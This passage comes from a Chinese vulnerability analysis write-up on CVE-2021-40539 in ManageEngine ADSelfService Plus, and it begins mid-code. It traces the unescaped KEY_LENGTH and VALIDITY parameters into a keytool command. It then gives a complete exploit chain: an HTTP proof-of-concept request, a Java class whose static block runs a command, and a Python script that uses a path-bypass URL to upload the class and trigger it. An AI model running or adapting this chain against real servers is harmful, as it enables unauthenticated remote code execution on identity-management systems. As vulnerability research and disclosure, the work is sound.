                        if (dynForm.get("HIDE_MACCESS_BUTTON").toString().equals("false")) {
                            CommonUtil.generateQrForSettingsConfiguration();
                        }
                        if (dynForm.get("userDisclaimerEnable").toString().equals("true")) {
                            ADSMPersUtil.updateUDEnableSettings("true");
                        } else {
                            ADSMPersUtil.updateUDEnableSettings("false");
                        }
                    }
                } else if (!"mob".equalsIgnoreCase(request.getParameter("form"))) {
                    if ("sso".equalsIgnoreCase(request.getParameter("form"))) {
                        message = rb.getString((String)request.getAttribute("ssoMessage"));
                        messageType = (String)request.getAttribute("ssoMessageType");
                        request.setAttribute("form", "sso");
                    }
                } else {
                    for(j = 0; j 
前往ConnectionAction中openSSLTool查看代码实现
    public ActionForward openSSLTool(ActionMapping actionMap, ActionForm actionForm, HttpServletRequest request, HttpServletResponse response) throws Exception {
            String action = request.getParameter("action");
            if (action != null && action.equals("generateCSR")) {
                SSLUtil.createCSR(request);
            }
            return actionMap.findForward("SSLTool");
        }
根据代码，在判断请求数据中action参数generateCSR后即调用SSLUtil.createCSR
    public static void createCSR(HttpServletRequest request) throws Exception {
            JSONObject sslParams = new JSONObject();
            sslParams.put("COMMON_NAME", request.getParameter("NAME"));
            sslParams.put("SAN_NAME", request.getParameter("SAN_NAME"));
            sslParams.put("OU", request.getParameter("OU"));
            sslParams.put("ORGANIZATION", request.getParameter("ORGANIZATION"));
            sslParams.put("LOCALITY", request.getParameter("LOCALITY"));
            sslParams.put("STATE", request.getParameter("STATE"));
            sslParams.put("COUNTRY_CODE", request.getParameter("COUNTRY_CODE"));
            sslParams.put("PASSWORD", request.getParameter("PASSWORD"));
            sslParams.put("VALIDITY", request.getParameter("VALIDITY"));
            sslParams.put("KEY_LENGTH", request.getParameter("KEY_LENGTH"));
            JSONObject csrStatus = createCSR(sslParams);
            if (csrStatus.has("eStatus")) {
                request.setAttribute("status", customizeError(csrStatus.getString("eStatus")));
            } else {
                request.setAttribute("status", "success");
            }
        }
从request中获取参数值后调用createCSR
    public static JSONObject createCSR(JSONObject sslSettings) throws Exception {
            ........
            StringBuilder keyCmd = new StringBuilder("..\\jre\\bin\\keytool.exe  -J-Duser.language=en -genkey -alias tomcat -sigalg SHA256withRSA -keyalg RSA -keypass ");
            keyCmd.append(password);
            keyCmd.append(" -storePass ").append(password);
            String keyLength = sslSettings.getString("KEY_LENGTH");
            if (keyLength != null && !keyLength.equals("")) {
                keyCmd.append(" -keysize ").append(keyLength);
            }
            String validity = sslSettings.getString("VALIDITY");
            if (validity != null && !validity.equals("")) {
                keyCmd.append(" -validity ").append(validity);
            }
            String san_name = sslSettings.getString("SAN_NAME");
            keyCmd.append(" -dName \"CN=").append(ClientUtil.keyToolEscape(sslSettings.getString("COMMON_NAME")));
            keyCmd.append(", OU= ").append(ClientUtil.keyToolEscape(sslSettings.getString("OU")));
            keyCmd.append(", O=").append(ClientUtil.keyToolEscape(sslSettings.getString("ORGANIZATION")));
            keyCmd.append(", L=").append(ClientUtil.keyToolEscape(sslSettings.getString("LOCALITY")));
            keyCmd.append(", S=").append(ClientUtil.keyToolEscape(sslSettings.getString("STATE")));
            keyCmd.append(", C=").append(ClientUtil.keyToolEscape(sslSettings.getString("COUNTRY_CODE")));
            keyCmd.append("\" -keystore ..\\jre\\bin\\SelfService.keystore");
            .........
            String status = runCommand(keyCmd.toString());
        }
    }
createCSR方法中，会拼接各字段值然后调用runCommand执行，其中对于大部分参数都是用了keyToolEscape针对特殊字符进行了转义，只有KEY_LENGTH以及VALIDITY两个字段没有被转义，因此可以利用这两个字段
静态大概分析清楚了，尝试动态调试，将断点下载createCSR对象runCommand这一行
但是尝试使用burp发送poc数据包，却并没有断下来，尝试单步，发现在函数第一行`sslSettings.getString("COMMON_NAME")`中报错进入异常处理
猜测应该是没有这个参数导致触发异常，看看下面还要区PASSWORD等其他参数的值，因此尝试修改poc，在其中加入这些字段参数
    POST /./RestAPI/Connection HTTP/1.1
    Host: 192.168.1.105:9251
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
    Accept: Content-Type: application/x-www-form-urlencoded
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Te: trailers
    Connection: close
    Content-Length: 249
    methodToCall=openSSLTool&action=generateCSR&KEY_LENGTH=1024+-providerclass+Si+-providerpath+"C:\ManageEngine\ADSelfService+Plus\bin"&NAME=test&VALIDITY=abc&PASSWORD=pasword&SAN_NAME=san&OU=ou&ORGANIZATION=og&LOCALITY=loc&STATE=state&COUNTRY_CODE=123
发现此时才可以成功触发断点
keycommand的值为`..\jre\bin\keytool.exe -J-Duser.language=en -genkey -alias
tomcat -sigalg SHA256withRSA -keyalg RSA -keypass "pasword" -storePass
"pasword" -keysize 1024 -providerclass Si -providerpath
"C:\ManageEngine\ADSelfService Plus\bin" -validity abc -dName "CN=test, OU=
ou, O=og, L=loc, S=state, C=123" -keystore ..\jre\bin\SelfService.keystore
-ext SAN=dns:san`
其中-providerpath后边的`"C:\ManageEngine\ADSelfService Plus\bin"`内容是我们注入的内容
下一步尝试看一下这条命令执行的含义
可知使用`-providerpath`以及`-providerclass`参数提供方类路径和类名，将要执行的代码放在静态区即可成功运行
## 漏洞利用
漏洞利用思路即利用三个漏洞，先上传编译好的带有命令执行的class文件，然后使用RCE漏洞触发上传的类中的静态方法
创建Si.java文件
    import java.io.*;
    public class Si{
        static{
            try{
                Runtime rt = Runtime.getRuntime();
                Process proc = rt.exec("calc");
            }catch (IOException e){}
        }
    }
编译该文件生成Si.class
`javac Si.java`
然后使用任意文件上传漏洞上传Si.class,然后再使用RCE漏洞触发Si这个类中的静态代码——执行calc.exe。因为生成的Si.class包含不可见字符，因此，简单写一个脚本来完成最后这两步实现印证
    import requests
    from time import sleep
    def upload(ip):
        url = 'http://{ip}:8888/%2e/RestAPI/LogonCustomization'.format(ip=ip)
        print(url)
        data = {"methodToCall":"unspecified", "Save":"yes","form":"smartcard","operation":"Add"}
        files = {'CERTIFICATE_PATH': ('Si.class', open('Si.class', 'rb'))}
        requests.post(url=url,data=data,files=files)
        return True
    def runcmd(ip):
        url = 'http://{ip}:8888/%2e/RestAPI/Connection'.format(ip=ip)
        data = {"methodToCall":'openSSLTool',"action":'generateCSR',"KEY_LENGTH":'1024 -providerclass Si -providerpath "C:\ManageEngine\ADSelfService+Plus\bin"',"NAME":'test',"VALIDITY":1,"PASSWORD":'pasword','SAN_NAME':'san',"OU":'ou','ORGANIZATION':'og','LOCALITY':'loc','STATE':'state','COUNTRY_CODE':'123'}
        requests.post(url=url,data=data)
    def main():
        ip = '172.16.113.169'
        upload(ip)
        sleep(3)
        runcmd(ip)
    if __name__ == "__main__":
        main()
运行可成功执行计算器
>
> 另外在这里记录一个很操蛋的问题，我这个脚本开始一直使用proxy通过burp发送不成功，但是不使用burp的proxy直接发送能成功，最后判断是因为burp会自动省略掉url里面的/./,很奇怪，不知道是bug还是burp自己刻意做的优化，如果是优化的话实在感觉很画蛇添足
## 参考
  1. [ManageEngine ADSelfService Plus（CVE-2021-40539）漏洞分析](https://xz.aliyun.com/t/10529)
  2. [ManageEngine ADSelfService Plus CVE-2021-40539 漏洞分析](https://www.anquanke.com/post/id/260904)
  3. [HOW TO EXPLOIT CVE-2021-40539 ON MANAGEENGINE ADSELFSERVICE PLUS](https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html)
  4. **[CVE-2021-40539](https://github.com/synacktiv/CVE-2021-40539)**